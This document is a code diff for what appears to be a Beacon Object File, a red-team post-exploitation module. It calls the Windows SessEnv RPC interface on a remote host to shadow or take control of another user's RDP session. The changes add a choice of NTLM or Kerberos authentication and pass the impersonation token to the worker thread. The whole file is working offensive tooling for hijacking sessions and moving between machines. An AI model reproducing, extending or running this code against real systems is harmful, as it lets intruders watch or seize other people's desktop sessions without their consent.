@@ -1,22 +1,15 @@
-#include <windows.h>
-#include <stdio.h>
-#include <iads.h>
-#include <initguid.h>
-#include <comutil.h>
-#include <combaseapi.h>
-#include <objbase.h>
-#include <activeds.h>
-#include <sddl.h>
 #include "bofdefs.h"
 #include "midl_user.c"
 #include "SessEnvRpc.h"
 #include "SessEnvRpc.c"
 
 typedef struct Params {
-    ULONG targetsessionid;
-    wchar_t lpswzComputerName[1024];
-    int controlreq;
+	ULONG targetsessionid;
+	wchar_t lpswzComputerName[1024];
+	int controlreq;
     WCHAR** dispatch;
+    HANDLE hToken;
+    DWORD authType;
 } Params;
 
 void DisplayError(WCHAR **dispatch, HRESULT hr)
@@ -46,11 +39,11 @@ void DisplayError(WCHAR **dispatch, HRESULT hr)
     }
 }
 
-RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle, LPWSTR lpswzComputerName)
+RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle, LPWSTR lpswzComputerName, DWORD authType)
 {
     RPC_STATUS status;
     RPC_BINDING_HANDLE v5;
-    RPC_SECURITY_QOS SecurityQOS = {};
+    RPC_SECURITY_QOS SecurityQOS = {0};
     RPC_WSTR StringBinding = NULL;
     RPC_BINDING_HANDLE Binding;
 
@@ -68,15 +61,24 @@ RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle, LPWSTR lpswzC
             SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
             SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
             SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
-            LPWSTR spnprepend = L"host/";
-            LPWSTR spn = (LPWSTR)malloc((wcslen(spnprepend) + wcslen(lpswzComputerName) + 1) * sizeof(wchar_t));
-            wcscat(spn, spnprepend); wcscat(spn, lpswzComputerName);
-            status = RpcBindingSetAuthInfoExW(Binding, (RPC_WSTR)spn, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NAME, (RPC_SECURITY_QOS*)&SecurityQOS);
+            LPWSTR spn = NULL;
+
+            if(authType == RPC_C_AUTHN_GSS_KERBEROS)
+            {
+                LPWSTR spnprepend = L"host/";
+                spn = (LPWSTR)malloc((wcslen(spnprepend) + wcslen(lpswzComputerName) + 4) * sizeof(wchar_t));
+                wcscat(spn, spnprepend); wcscat(spn, lpswzComputerName);
+            }
+            status = RpcBindingSetAuthInfoExW(Binding, (RPC_WSTR)spn, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, authType, 0, RPC_C_AUTHZ_NONE, (RPC_SECURITY_QOS*)&SecurityQOS);
             if (!status)
             {
                 v5 = Binding;
                 Binding = 0;
                 *binding_handle = v5;
+            }
+            if(spn != NULL)
+            {
+                free(spn);
             }
         }
     }
@@ -92,12 +94,12 @@ RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle, LPWSTR lpswzC
 
 #endif
 
-void execute(WCHAR** dispatch, LPWSTR lpswzComputerName, int controlreq, ULONG targetsessionid)
+void execute(WCHAR** dispatch, LPWSTR lpswzComputerName, int controlreq, ULONG targetsessionid, DWORD authType)
 {
-    HRESULT hr;
+    HRESULT hr = NULL;
     RPC_BINDING_HANDLE handle;
-    RPC_STATUS status = CreateBindingHandle(&handle, lpswzComputerName);
-    SHADOW_REQUEST_RESPONSE shadowresponse;
+    RPC_STATUS status = CreateBindingHandle(&handle, lpswzComputerName, authType);
+    SHADOW_REQUEST_RESPONSE shadowresponse = SHADOW_REQUEST_RESPONSE_DECLINE;
     LPWSTR shadowinvitation = (LPWSTR)malloc(16384);
     ULONG shadowinvitationsize = 8192;
     if (SUCCEEDED(status))
@@ -132,13 +134,16 @@ LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
 unsigned __stdcall BeginStub(void* p)
 {
     Params* params = (Params*)p;
-    execute(params->dispatch, params->lpswzComputerName, params->controlreq, params->targetsessionid);
+    SetThreadToken(NULL, params->hToken);
+    CloseHandle(params->hToken);
+    execute(params->dispatch, params->lpswzComputerName, params->controlreq, params->targetsessionid, params->authType);
     return 0;
 }
 
-void shadowRDPinv(WCHAR** dispatch, LPWSTR lpswzComputerName, char* control, ULONG targetsessionid)
+void shadowRDPinv(WCHAR** dispatch, LPWSTR lpswzComputerName, char* control, ULONG targetsessionid, char* authTypeString)
 {
     int controlreq = 0;
+    DWORD authType = RPC_C_AUTHN_WINNT;
     if (strcmp(control, "control") == 0)
     {
         controlreq = SHADOW_CONTROL_REQUEST_TAKECONTROL;
@@ -152,15 +157,30 @@ void shadowRDPinv(WCHAR** dispatch, LPWSTR lpswzComputerName, char* control, ULO
         PRINT(dispatch, "Please provide a valid control type!");
         return;
     }
+    if (strcmp(authTypeString, "NTLM") == 0)
+    {
+        authType = RPC_C_AUTHN_WINNT;
+    }
+    else if (strcmp(authTypeString, "KERBEROS") == 0)
+    {
+        authType = RPC_C_AUTHN_GSS_KERBEROS;
+    }
+    else
+    {
+        PRINT(dispatch, "Please provide a valid authentication protocol!");
+        return;
+    }
     DWORD exitcode = 0;
-    HANDLE thread = NULL;
-    PVOID handler = NULL;
-    Params * params = NULL;
+	HANDLE thread = NULL;
+	PVOID handler = NULL;
+	Params * params = NULL;
     params = (Params*)malloc(sizeof(Params));
-    wcscpy(params->lpswzComputerName, lpswzComputerName);
-    params->controlreq = controlreq;
-    params->targetsessionid = 1;
+	wcscpy(params->lpswzComputerName, lpswzComputerName);
+	params->controlreq = controlreq;
+	params->targetsessionid = 1;
     params->dispatch = dispatch;
+    params->authType = authType;
+    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &params->hToken);
     handler = KERNEL32$AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
     thread = (HANDLE)MSVCRT$_beginthreadex(NULL, 0, BeginStub, params, 0, NULL);
     WaitForSingleObject(thread, INFINITE);
@@ -171,7 +191,7 @@ void shadowRDPinv(WCHAR** dispatch, LPWSTR lpswzComputerName, char* control, ULO
     }
     if (thread) { KERNEL32$CloseHandle(thread); }
     if (handler) { KERNEL32$RemoveVectoredExceptionHandler(handler); }
-    if(params) {free(params);}
+	if(params) {free(params);}
 }
 
 #ifdef BOF
@@ -182,11 +202,12 @@ void go(char* args, int length) {
     char* ComputerName = BeaconDataExtract(&parser, NULL);
     char* StrControlreq = BeaconDataExtract(&parser, NULL);
     char* StrSesssionId = BeaconDataExtract(&parser, NULL);
+    char* authTypeString = BeaconDataExtract(&parser, NULL);
     ULONG SessionId = atoi(StrSesssionId);
     int lpswzComputerName_size = MultiByteToWideChar( CP_ACP , 0 , ComputerName , -1, NULL , 0 );
     LPWSTR lpswzComputerName = (LPWSTR)malloc((lpswzComputerName_size + 1) * sizeof(wchar_t));
     MultiByteToWideChar(CP_ACP, 0, ComputerName, -1, lpswzComputerName, lpswzComputerName_size);
-    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId);
+    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId, authTypeString);
     free(lpswzComputerName);
 }
 
@@ -196,11 +217,12 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
     char* ComputerName = argv[0];
     char* StrControlreq = argv[1];
     char* StrSesssionId = argv[2];
+    char* authTypeString = argv[3];
     ULONG SessionId = atoi(StrSesssionId);
     int lpswzComputerName_size = MultiByteToWideChar( CP_ACP , 0 , ComputerName , -1, NULL , 0 );
     LPWSTR lpswzComputerName = (LPWSTR)malloc((lpswzComputerName_size + 1) * sizeof(wchar_t));
     MultiByteToWideChar(CP_ACP, 0, ComputerName, -1, lpswzComputerName, lpswzComputerName_size);
-    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId);
+    shadowRDPinv(NULL, lpswzComputerName, StrControlreq, SessionId, authTypeString);
     free(lpswzComputerName);
 }
 #endif
